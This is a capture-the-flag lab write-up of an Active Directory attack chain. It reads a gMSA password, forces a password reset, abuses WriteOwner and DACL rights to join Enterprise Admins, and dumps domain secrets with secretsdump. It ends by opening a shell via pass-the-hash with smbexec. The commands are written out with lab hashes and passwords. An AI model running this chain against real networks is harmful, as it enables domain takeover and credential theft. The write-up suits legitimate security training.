---
id: "part5"
title: "NHA - Part 5 - GMSA - DACL - DC"
toc_min_heading_level: 2
toc_max_heading_level: 4
---

### NHA - Part 5

When we left off we found out that with our `Share` machine we found the following;

![nha-part5-1](./nha-part5-1.png)

#### ReadGMSAPassword

We can use [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) to get the password for GMSA.

*Attempting to do however leads to the following*
![nha-part5-2](./nha-part5-2.png)

My initial thought was this is because I didnt have the LM hash, so taking the administrator hash we can use `nxc` with `--lsa` we can try and get it.

```bash
nxc smb share -u Administrator -H 7849822ea2995bac91cc0a20c6af1fbe --local-auth --lsa
```

*unexpected.jpg*
![nha-part5-3](./nha-part5-3.png)

Well, in attempting to get the LT ... `nxc` seems to have done the hard work for us. Attempting to use the `gmsadumper` with the LT hash found fails - so we will take the `nxc` results and move forward.

#### ForceChangePassword

Next we can use the `ForceChangePassword` attribute from the GMSA account on the `Backup` account.

We can use the `pth-toolkit` either from the kali repos or the [GitHub Repo](https://github.com/byt3bl33d3r/pth-toolkit)

This isnt as intuitive as you think -- be sure to note the "ffff", the wonderful people at [TheHacker.Recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) always save the day.

![nha-part5-4](./nha-part5-4.png)

#### WriteOwner

We have `WriteOwner` on the Enterprise Admins group, we can simply add the backup user to EA

First we can allow ourselves to **be owners** of the group:

```bash
owneredit.py -action write -new-owner-dn 'CN=BACKUP,CN=USERS,DC=ACADEMY,DC=NINJA,DC=LAN' -target-dn 'CN=ENTERPRISE ADMINS,CN=Users,DC=academy,DC=ninja,DC=lan' 'academy.ninja.lan/backup':'Iloveu1!' -dc-ip 192.168.56.20
```

![nha-part5-5](./nha-part5-5.png)

Then we will add give ourselves **write** access to the group

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'backup' -target-dn 'CN=ENTERPRISE ADMINS,CN=Users,DC=academy,DC=ninja,DC=lan' 'academy'/'backup':'Iloveu1!' -dc-ip 192.168.56.20
```

![nha-part5-6](./nha-part5-6.png)

Now we will **add ourselves** to the group

```text
pth-net rpc group addmem "Enterprise Admins" "backup" -U 'academy/backup'%'Iloveu1!' -S 'dc-ac.academy.ninja.lan'
```

![nha-part5-7](./nha-part5-7.png)

#### Secretsdump

Now we are an Enterprise Admin. We can use `Secretsdump` to pull all our secrets

```text
secretsdump.py academy/backup:'Iloveu1!'@dc-ac.academy.ninja.lan -output dcac-dump
```

![nha-part5-8](./nha-part5-8.png)

#### Flags

We can use `smbexec` to get a semi shell

```text
smbexec.py Administrator@dc-ac.academy.ninja.lan -hashes aad3b435b51404eeaad3b435b51404ee:8fd12ffe951b45af5bea2bd921accba4
```

![nha-part5-9](./nha-part5-9.png)

![nha-part5-10](./nha-part5-10.png)

Then to make things easier to read - we can upload the `runme.bat` and execute our terminal based shell

![nha-part5-11](./nha-part5-11.png)

![nha-part5-12](./nha-part5-12.png)

Flag: `NHA{WellD0ne_Sense1!_nowroot_secOnd_Domain}`
